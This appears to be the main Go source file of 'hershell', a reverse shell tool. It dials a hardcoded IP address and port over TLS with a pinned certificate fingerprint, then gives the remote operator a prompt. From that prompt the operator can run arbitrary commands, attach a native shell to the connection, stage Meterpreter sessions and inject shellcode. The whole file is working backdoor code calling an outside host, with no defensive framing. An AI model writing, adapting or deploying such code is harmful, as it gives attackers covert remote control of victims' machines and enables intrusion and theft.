package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"net"
	"os"
	"strings"
)

const (
	errCouldNotDecode  = 1 << iota
	errHostUnreachable = iota
	errBadFingerprint  = iota
)

var (
    connectString = "104.10.84.54:55501"
    fingerPrint = "61:84:EA:5C:F5:6A:AC:2D:5E:37:1A:48:68:42:F3:C8:5C:68:7C:77:B0:DC:CE:91:3B:DF:8E:1B:18:C8:B3:83"
)

func interactiveShell(conn net.Conn) {
	var (
		exit    = false
		prompt  = "[hershell]> "
		scanner = bufio.NewScanner(conn)
	)

	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "meterpreter":
				if len(argv) > 2 {
					transport := argv[1]
					address := argv[2]
					ok, err := Meterpreter(transport, address)
					if !ok {
						conn.Write([]byte(err.Error() + "\n"))
					}
				} else {
					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
				}
			case "inject":
				if len(argv) > 1 {
					InjectShellcode(argv[1])
				}
			case "exit":
				exit = true
			case "run_shell":
				conn.Write([]byte("Enjoy your native shell\n"))
				runShell(conn)
			default:
				ExecuteCmd(command, conn)
			}

			if exit {
				break
			}

		}
		conn.Write([]byte(prompt))
	}
}

func runShell(conn net.Conn) {
	var cmd = GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(errHostUnreachable)
	}

	defer conn.Close()

	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(errBadFingerprint)
	}
	interactiveShell(conn)
}

func main() {
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(errCouldNotDecode)
		}
		reverse(connectString, bytesFingerprint)
	}
}
